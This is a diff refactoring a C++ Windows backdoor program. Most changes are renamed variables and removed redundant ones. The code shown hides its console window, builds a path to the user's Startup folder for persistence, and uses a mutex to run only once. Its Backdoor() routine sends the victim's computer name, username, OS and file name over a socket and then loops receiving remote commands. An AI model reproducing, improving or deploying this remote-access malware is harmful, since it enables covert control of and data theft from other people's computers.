@@ -12,9 +12,9 @@ std::vector<std::string> logs;
 std::string username = getenv("username");
 std::string computer = getenv("computername");
 std::string appdata = getenv("appdata");
-std::string o_system = getenv("os");
+std::string operatingSystem = getenv("os");
 std::string startupPath = "C:/Users/" + username + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";
-std::string file, command, data, fileName, firstPath;
+std::string command, fileName, originalPlacementPath;
 
 SOCKET objSocket;
 char buffer[16384];
@@ -63,12 +63,11 @@ void Backdoor()
         Backdoor();
     }
 
-    send(computer + "\n" + username + "\n" + o_system + "\n" + file);
+    send(computer + "\n" + username + "\n" + operatingSystem + "\n" + fileName);
     while (true)
     {
         memset(buffer, 0, sizeof(buffer));
         command.clear();
-        data.clear();
 
         ssize_t server = recv(objSocket, buffer, sizeof(buffer), 0);
         if (server == SOCKET_ERROR || server == NO_BYTES_IN_BUFFER || server == sizeof(buffer)) {
@@ -159,13 +158,10 @@ int main()
 {
     AllocConsole();
     ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
-    
     GetModuleFileNameA(nullptr, buffer, MAX_PATH);
-    std::string path = buffer;
 
-    firstPath = path;
-    fileName = path.substr(path.find_last_of("/\\") + 1);
-    file = fileName;
+    originalPlacementPath = buffer;
+    fileName = originalPlacementPath.substr(originalPlacementPath.find_last_of("/\\") + 1);
 
     CreateMutexA(0, FALSE, fileName.data());
     if (GetLastError() == ERROR_ALREADY_EXISTS) {
